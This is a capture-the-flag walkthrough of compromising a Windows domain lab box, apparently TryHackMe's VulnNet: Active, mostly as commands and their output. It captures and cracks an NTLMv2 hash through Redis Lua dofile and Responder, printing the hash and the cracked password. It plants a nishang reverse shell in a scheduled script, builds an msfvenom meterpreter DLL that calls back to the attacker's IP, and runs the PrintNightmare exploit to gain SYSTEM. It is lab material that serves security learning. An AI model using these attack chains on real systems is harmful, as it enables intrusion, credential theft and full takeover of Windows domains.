@@ -1,0 +1,407 @@
+nmap -sSVC -p- -v -oA nmap_full -Pn 10.10.255.87
+
+
+Nmap scan report for 10.10.255.87
+Host is up (0.061s latency).
+Not shown: 65522 filtered tcp ports (no-response)
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+6379/tcp  open  redis         Redis key-value store 2.8.2402
+49665/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49669/tcp open  msrpc         Microsoft Windows RPC
+49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49683/tcp open  msrpc         Microsoft Windows RPC
+49696/tcp open  msrpc         Microsoft Windows RPC
+49722/tcp open  msrpc         Microsoft Windows RPC
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time:
+|   date: 2021-12-14T16:44:46
+|_  start_date: N/A
+| smb2-security-mode:
+|   3.1.1:
+|_    Message signing enabled and required
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Tue Dec 14 17:45:23 2021 -- 1 IP address (1 host up) scanned in 715.74 seconds
+
+
+
+┌──(root💀kali)-[~]
+└─# redis-cli -h 10.10.235.238
+10.10.235.238:6379> info
+# Server
+redis_version:2.8.2402
+redis_git_sha1:00000000
+redis_git_dirty:0
+redis_build_id:b2a45a9622ff23b7
+redis_mode:standalone
+os:Windows  
+arch_bits:64
+multiplexing_api:winsock_IOCP
+process_id:972
+run_id:b77af9d0d971235bc62ae3cab1b3a82d29a81290
+tcp_port:6379
+uptime_in_seconds:488
+uptime_in_days:0
+hz:10
+lru_clock:5506473
+config_file:
+
+# Clients
+connected_clients:1
+client_longest_output_list:0
+client_biggest_input_buf:0
+blocked_clients:0
+
+# Memory
+used_memory:952952
+used_memory_human:930.62K
+used_memory_rss:919408
+used_memory_peak:977360
+used_memory_peak_human:954.45K
+used_memory_lua:36864
+mem_fragmentation_ratio:0.96
+mem_allocator:dlmalloc-2.8
+
+# Persistence
+loading:0
+rdb_changes_since_last_save:0
+rdb_bgsave_in_progress:0
+rdb_last_save_time:1649673153
+rdb_last_bgsave_status:ok
+rdb_last_bgsave_time_sec:-1
+rdb_current_bgsave_time_sec:-1
+aof_enabled:0
+aof_rewrite_in_progress:0
+aof_rewrite_scheduled:0
+aof_last_rewrite_time_sec:-1
+aof_current_rewrite_time_sec:-1
+aof_last_bgrewrite_status:ok
+aof_last_write_status:ok
+
+# Stats
+total_connections_received:1
+total_commands_processed:1
+instantaneous_ops_per_sec:0
+total_net_input_bytes:31
+total_net_output_bytes:0
+instantaneous_input_kbps:0.00
+instantaneous_output_kbps:0.00
+rejected_connections:0
+sync_full:0
+sync_partial_ok:0
+sync_partial_err:0
+expired_keys:0
+evicted_keys:0
+keyspace_hits:0
+keyspace_misses:0
+pubsub_channels:0
+pubsub_patterns:0
+latest_fork_usec:0
+
+# Replication
+role:master
+connected_slaves:0
+master_repl_offset:0
+repl_backlog_active:0
+repl_backlog_size:1048576
+repl_backlog_first_byte_offset:0
+repl_backlog_histlen:0
+
+# CPU
+used_cpu_sys:0.75
+used_cpu_user:0.92
+used_cpu_sys_children:0.00
+used_cpu_user_children:0.00
+
+# Keyspace
+(0.65s)
+
+
+
+
+┌──(root💀kali)-[~]
+└─# enum4linux -a 10.10.235.238                                                                                        
+Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Mon Apr 11 16:03:42 2022
+
+ ========================== 
+|    Target Information    |
+ ========================== 
+Target ........... 10.10.235.238
+RID Range ........ 500-550,1000-1050
+Username ......... ''
+Password ......... ''
+Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
+
+
+ ===================================================== 
+|    Enumerating Workgroup/Domain on 10.10.235.238    |
+ ===================================================== 
+[E] Can't find workgroup/domain
+
+
+ ============================================= 
+|    Nbtstat Information for 10.10.235.238    |
+ ============================================= 
+Looking up status of 10.10.235.238
+No reply from 10.10.235.238
+
+ ====================================== 
+|    Session Check on 10.10.235.238    |
+ ====================================== 
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 437.
+[+] Server 10.10.235.238 allows sessions using username '', password ''
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 451.
+[+] Got domain/workgroup name: 
+
+ ============================================ 
+|    Getting domain SID for 10.10.235.238    |
+ ============================================ 
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 359.
+Domain Name: VULNNET
+Domain Sid: S-1-5-21-1405206085-1650434706-76331420
+[+] Host is part of a domain (not a workgroup)
+
+ ======================================= 
+|    OS information on 10.10.235.238    |
+ ======================================= 
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 458.
+Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
+[+] Got OS info for 10.10.235.238 from smbclient: 
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 467.
+[+] Got OS info for 10.10.235.238 from srvinfo:
+Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED
+
+ ============================== 
+|    Users on 10.10.235.238    |
+ ============================== 
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 866.
+[E] Couldn't find users using querydispinfo: NT_STATUS_ACCESS_DENIED
+
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 881.
+[E] Couldn't find users using enumdomusers: NT_STATUS_ACCESS_DENIED
+
+ ========================================== 
+|    Share Enumeration on 10.10.235.238    |
+ ========================================== 
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 640.
+do_connect: Connection to 10.10.235.238 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+Reconnecting with SMB1 for workgroup listing.
+Unable to connect with SMB1 -- no workgroup available
+
+[+] Attempting to map shares on 10.10.235.238
+
+ ===================================================== 
+|    Password Policy Information for 10.10.235.238    |
+ ===================================================== 
+[E] Unexpected error from polenum:
+
+
+[+] Attaching to 10.10.235.238 using a NULL share
+
+[+] Trying protocol 139/SMB...
+
+        [!] Protocol failed: Cannot request session (Called Name:10.10.235.238)
+
+[+] Trying protocol 445/SMB...
+
+        [!] Protocol failed: SAMR SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.
+
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 501.
+
+[E] Failed to get password policy with rpcclient
+
+
+ =============================== 
+|    Groups on 10.10.235.238    |
+ =============================== 
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542.
+
+[+] Getting builtin groups:
+
+[+] Getting builtin group memberships:
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542.
+
+[+] Getting local groups:
+
+[+] Getting local group memberships:
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 593.
+
+[+] Getting domain groups:
+
+[+] Getting domain group memberships:
+
+ ======================================================================== 
+|    Users on 10.10.235.238 via RID cycling (RIDS: 500-550,1000-1050)    |
+ ======================================================================== 
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 710.
+[E] Couldn't get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 742.
+
+ ============================================== 
+|    Getting printer info for 10.10.235.238    |
+ ============================================== 
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 991.
+Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED
+
+
+enum4linux complete on Mon Apr 11 16:07:30 2022
+
+
+
+
+impacket-rpcdump @active.thm
+
+And got a lot of output!
+Now, I check if this is vulnerable to PrintNightmare. I ran:
+
+impacket-rpcdump @active.thm | egrep 'MS-RPRN|MS-PAR'
+
+
+
+active.thm:6379> eval "dofile('C:\\\\Users\\\\enterprise-security\\\\Desktop\\\\user.txt')" 0
+
+Now, I set-up responder by running this:
+
+responder -I tun0 -rdvw
+
+Then ran this command on redis-cli:
+
+eval "dofile('//10.9.1.100/share')" 0
+
+(You can write anything in place of share, the share does not need to exist)
+
+And we have got the user’s pasword hash!
+
+enterprise-security::VULNNET:b53d4d5aaed8e416:8C9D49860FFD5740F38F63C7BBBFA071:010100000000000000138401188AD701C7395849BB4B49210000000002000800450033003400460001001E00570049004E002D003400310035004C004B004E0048005A004C004500450004003400570049004E002D003400310035004C004B004E0048005A004C00450045002E0045003300340046002E004C004F00430041004C000300140045003300340046002E004C004F00430041004C000500140045003300340046002E004C004F00430041004C000700080000138401188AD701060004000200000008003000300000000000000000000000003000009CA68207C8074EF63BC8B86A4BE5C6D356D57EB1F8CB5F2D15FAFB3A869AF7EC0A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E0039002E0031002E003100300030000000000000000000
+
+Let’s crack it using hashcat
+
+.\hashcat.exe -m 5600 -a 0.\hash.txt .\wordlists\rockyou.txt
+
+I ran it on my Windows machine, you can run it on Linux as well.
+I got the password as: sand_0873959498
+
+Now, let’s try connecting to SMB:
+
+smbclient -L \\\\active.thm\\ -U enterprise-security
+
+And we can see the shares. Let’s check the Enterprise-Share
+
+smbclient \\\\active.thm\\Enterprise-Share -U enterprise-security
+
+We have a single file here named PurgeIrrelevantData_1826.ps1 with contents:
+
+rm -Force C:\Users\Public\Documents\* -ErrorAction SilentlyContinue
+
+I tried to replace this file to get a shell. I used nishang’s Invoke-PowerShellTcp.ps1. I added this line to the bottom:
+
+Invoke-PowerShellTcp -Reverse -IPAddress 10.9.1.100 -Port 4443
+
+Then renamed it to PurgeIrrelevantData_1826.ps1 and uploaded it, while setting up a nc listener:
+
+rlwrap nc -lnvp 4443
+
+And, we got the shell, but as enterprise-security.
+Run systeminfo to check that we are on an x64 windows machine.
+I still think that it is vulnerable to Print Nightmare, so I’m gonna try that. I used these as reference.
+GitHub - cube0x0/CVE-2021-1675: C# and Impacket implementation of PrintNightmare…
+Impacket implementation of the PrintNightmare PoC originally created by Zhiniang Peng (@edwardzpeng) & Xuefeng Li…
+
+github.com
+
+I’m gonna install a virtual environment for this:
+
+apt install virtualenv
+
+I cloned this github repo, went inside it then ran:
+
+virtualenv --python=python3 impacketsource impacket/bin/activate
+
+As you can see, we are in the virtual environment now. Next, run:
+
+pip3 install .pip2 install .
+
+to install all the modules here in the environment.
+Now, we need to create a malicious dll file.
+
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.9.1.100 LPORT=1235 -f dll > shell.dll
+
+Copy this shell.dll to your virtual environment folder, then fire up msfconsole. Enter these in there:
+
+msf6 > use multi/handlermsf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcpmsf6 exploit(multi/handler) > set lhost tun0msf6 exploit(multi/handler) > set lport 1235msf6 exploit(multi/handler) > run
+
+Now, go to your virtual environment and run in the impacket directory:
+
+smbserver.py share `pwd` -smb2support
+
+to host the file.
+Now, create another virtual environment. Copy CVE-2021–1675.py from the downloaded CVE to your virtual environment’s directory, then run this on your virtual environment:
+
+python3 CVE-2021-1675.py VULNNET/enterprise-security:'sand_0873959498'@active.thm '\\10.9.1.100\share\shell.dll'
+
+And we are nt authority\system!
+Get system.txt from C:\Users\Administrator\Desktop\system.txt.
+
+I tried another method to get root and I thought of updating this writeup with that method as well.
+
+For that, first get the user enterprise-security’s shell. Then i used nc.exe to get another shell as this shell was really unstable. Next, I upload /usr/lib/bloodhound/resources/app/Collectors/SharpHound.exe to the victim’s machine.
+Next, I ran bloodhoud:
+
+neo4j consolebloodhound
+
+Ran this command in the remote machine:
+
+.\SharpHound.exe --CollectionMethod All
+
+Then I copied the resulting zip file to C:\Enterprise-Share
+
+powershell cp .\20210805125451_BloodHound.zip C:\Enterprise-Share\20210805125451_BloodHound.zip
+
+Next, login to the SMB share and download it. Next, upload it to Bloodhound using the Upload Data option:
+
+I ran the query Find Shortest Paths to Domain Admins and found this path to get to Administrator.
+I searched for some privilege escalation techniques and found these articles:
+Abusing Token Privileges For Windows Local Privilege Escalation
+By @dronesec and @breenmachine This a project my friend drone and I have been poking at for quite some time and are…
+
+foxglovesecurity.com
+Rotten Potato - Privilege Escalation from Service Accounts to SYSTEM
+By @breenmachine This past Friday, myself and my partner in crime, Chris Mallz (@vvalien1) spoke at DerbyCon about a…
+
+foxglovesecurity.com
+Abusing Active Directory ACLs/ACEs
+If you have these privileges on a Computer object, you can pull Kerberos Resource-based Constrained Delegation…
+
+www.ired.team
+
+As said in the first article, I ran whoami /priv and got this:
+
+I have the SeImpersonatePrivilege enabled. So, I guess I can abuse it. But, that’s for another time. I found some more articles:
+Abusing Active Directory ACLs/ACEs
+If you have these privileges on a Computer object, you can pull Kerberos Resource-based Constrained Delegation …
+
+book.hacktricks.xyz
+BloodHound 1.3 - The ACL Attack Path Update
+Intro & Background In 2014, Emmanuel Gras and Lucas Bouillot presented their work titled "Chemins de contrôle en…
+
+wald0.com
+
+(To be continued…)
+
+We have successfully pwned the box!
+
+
+
+
